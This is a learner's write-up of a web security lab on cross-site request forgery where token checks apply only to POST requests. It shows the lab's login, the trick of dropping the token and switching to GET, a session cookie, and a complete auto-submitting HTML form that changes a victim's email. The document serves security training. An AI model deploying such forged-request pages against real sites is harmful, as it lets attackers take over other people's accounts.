LAB INFO: CSRF where token validation depends on request method

MORE INFO:  This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter 

ANALYSIS:
1. We do login with the given credentials i.e username=wiener and password=peter
2. And we notice that the /login parameter in the post request contain the csrf=some_value but that is unpredictable
3.And in the login page we do also notice that, there is an update email field so let's update the email:
     3.1 Suprise there is csrf parameter that have some random value as we know that is unpredictable so we can't perfomr csrf attack there.
     3.2 So, let's try by removing that csrf parameter with the post request ==> missing csrf parameter
     3.2 So, let's try by removing the csrf parameter as well as changing the request from POST to GET==> and hence it works (So, let's check if all 3 condition of csrf attack is possible here or not)
           3.2.1 A relevant action- change email good to go
           3.2.2 Cookie based session handling: Cookie: session=pxxwbAgFoHZZFWvNLFSLtJXOh9ng3Nzb {good to go}
           3.2.3. No unpredictable request parameter --> as we remove csrf(which is unpredictable and only remains email field that is predicatable) {good to go from here too}
4. Let's generate the poc script of csrf from here
    4.1 <html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a03000f045b2966802030670063006b.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="hackerMeAgainEmail&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
5. And deliver it to the victim and it will solve the lab.


LET'S SCRIPT IT MANUALLY.